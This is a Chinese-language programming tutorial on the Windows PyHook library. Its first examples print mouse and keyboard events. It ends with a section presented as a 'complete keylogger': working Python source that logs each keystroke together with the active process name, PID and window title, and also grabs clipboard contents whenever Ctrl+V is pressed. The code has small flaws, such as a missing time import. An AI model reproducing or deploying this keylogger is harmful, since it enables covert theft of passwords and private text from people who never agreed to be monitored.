## PyHook

这是用来监听键盘和鼠标的钩子，因为它是依赖于 PyWin32 的，因此只能在 Windows 上运行。

想要监听键盘或鼠标的事件，首先需要有一个 Windows 的消息通道，通过 PyWin32 扩展包的 pythoncom 来提供消息引入。

### 监听鼠标

```python

import pyHook,pythoncom

def onMouseEvent(event):
	print "MessageName:",event.MessageName
	print "Message:",event.Message
	print "Time:",event.Time
	print "Window:",event.Window
	print "WindowName:",event.WindowName
	print "Position:",event.Position
	print "Wheel:",event.Wheel
	print "Injected:",event.Injected

	return True

hm = pyHook.HookManager()
hm.MouseAll = onMouseEvent
hm.HookMouse()
pythoncom.PumpMessages()
```

首先创建 HookManager 对象，然后为其绑定一个回调函数，最后开始监听鼠标事件即可。

在回调函数中一定要返回 True ，否则鼠标会卡死在回调函数中不能动。

### 监听键盘

```python


import pyHook,pythoncom

def onKeyboardEvent(event):
	print "MessageName:",event.MessageName
	print "Message:",event.Message
	print "Time:",event.Time
	print "Window:",event.Window
	print "WindowName",event.WindowName
	print "Ascii:",event.Ascii,chr(event.Ascii)
	print "Key:",event.Key
	print "KeyID:",event.KeyID
	print "ScanCode:",event.ScanCode
	print "Extended:",event.Extended
	print "Injected:",event.Injected
	print "Alt",event.Alt
	print "Transition:",event.Transition

	return True

hm = pyHook.HookManager()
hm.KeyDown = onKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()

```

基本使用也是与鼠标监听类似。

### 完整的 键盘记录器

```python


from ctypes import *
import pyHook
import pythoncom
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

# 获得当前的进程名称
def getCurrentProcess():

	# 获取最上层的窗口句柄
	hwnd = user32.GetForegroundWindow()

	# 获取进程ID
	pid = c_ulong(0)
	user32.GetWindowThreadProcessId(hwnd,byref(pid))

	# 将进程ID存入变量中
	process_id = "%d" % pid.value

	# 申请内存
	executable = create_string_buffer("\x00"*512)
	h_process = kernel32.OpenProcess(0x400 | 0x10,False,pid)

	psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

	# 读取窗口标题
	windows_title = create_string_buffer("\x00"*512)
	length = user32.GetWindowTextA(hwnd,byref(windows_title),512)

	# 打印
	print
	print "[ TIME:%s ]" % time.strftime('%Y-%m-%d %H:%M:%S',time.localtime())
	print "[ PID:%s-%s-%s]" % (process_id,executable.value,windows_title.value)
	print

	# 关闭handles
	kernel32.CloseHandle(hwnd)
	kernel32.CloseHandle(h_process)

# 定义击键监听事件函数
def onKeyboardEvent(event):
	global current_window

	# 检测目标窗口是否转移(换了其他窗口就监听新的窗口)
	if event.WindowName != current_window:
		current_window = event.WindowName
		# 函数调用
		getCurrentProcess()

	# 检测击键是否常规按键 (非组合键等)
	if event.Ascii > 32 and event.Ascii < 127 :
		print chr(event.Ascii),
	else:
		# 如果发现Ctrl+v（粘贴）事件，就把粘贴板内容记录下来
		if event.Key == 'V':
			win32clipboard.OpenClipboard()
			pasted_value = win32clipboard.GetClipboardData()
			win32clipboard.CloseClipboard()
			print '[PASTE]-%s' % (pasted_value) , 
		else:
			print "[%s]" % event.Key,

	return True

# 创建并注册hook管理器
hm = pyHook.HookManager()
hm.KeyDown = onKeyboardEvent

# 注册hook并执行
hm.HookKeyboard()
pythoncom.PumpMessages()

```